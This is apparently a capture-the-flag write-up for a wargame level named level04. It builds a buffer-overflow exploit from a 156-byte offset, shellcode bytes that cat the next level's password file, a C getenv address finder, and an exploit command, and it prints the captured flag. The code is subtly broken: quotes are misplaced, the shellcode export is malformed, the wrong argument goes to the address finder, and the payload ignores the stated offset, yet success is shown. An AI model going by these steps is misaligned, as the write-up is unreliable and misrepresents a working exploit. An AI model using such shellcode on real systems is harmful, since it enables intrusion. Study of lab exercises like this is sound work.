# level04

For this level, we have a program that is telling us `Give me some shellcode, k` and we can see that it create a child process and that we can make segfault the child process. 

With [gdb](gdbwriteup.md), we found that the buffer is at 156, so we will have to inject our shellcode after that.

```bash
python -c 'print("\x90" + "SHELLCODE ADDRESS") | ./level04'
```

We will create a shellcode that will cat the flag, and we will use [this generator](https://masterccc.github.io/tools/shellcode_gen/) to create it.

```bash
export SHELLCODE=$(\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x30\x35\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80
)
```

Now, we will create a program to find the address of our shellcode.

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    if (argc == 2)    
        printf("%p\n", getenv(argv[1]));
    return (0);
}
```
We will need to compile it with the flag `-m32` to get the address in 32 bits.

```bash
gcc -m32 -o getaddr getaddr.c
./getaddr $SHELLCODE
```

Now, we can run our exploit.

```bash
python -c 'print("\x90" + "SHELLCODE ADDRESS") | ./level04'
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```